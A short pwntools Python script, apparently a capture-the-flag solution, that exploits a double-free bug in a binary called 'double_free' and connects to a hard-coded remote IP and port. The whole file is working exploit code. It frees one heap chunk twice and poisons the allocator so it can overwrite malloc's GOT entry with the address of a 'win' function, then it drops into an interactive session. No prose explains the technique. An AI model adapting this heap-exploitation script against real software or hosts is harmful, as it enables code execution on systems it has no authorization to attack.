from pwn import process, gdb, args, p64, ELF, remote
binary = './double_free'

gs = """
break main
continue
"""

e = ELF(binary)
END_OF_MENU = "e.g, l\n"

def malloc(p, size):
    p.sendline(b"m %d" % size)
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"f %d" % index)
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    p.recvuntil(END_OF_MENU)

def exit(p):
    p.sendline(b"0")

def launch_attack(p):
    malloc(p,8) 
    free(p, 0)
    free(p,0)
    malloc(p,8)
    pointer = p64(e.got["malloc"])
    edit(p, 1, pointer)
    malloc(p,8)
    malloc(p,8)
    edit(p, 3, p64(e.symbols.win))
    p.interactive()

def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        # p = process(binary)
        p = remote("107.21.135.41", 12222)
    p.recvuntil(END_OF_MENU)
    launch_attack(p)

if __name__ == "__main__":
    main()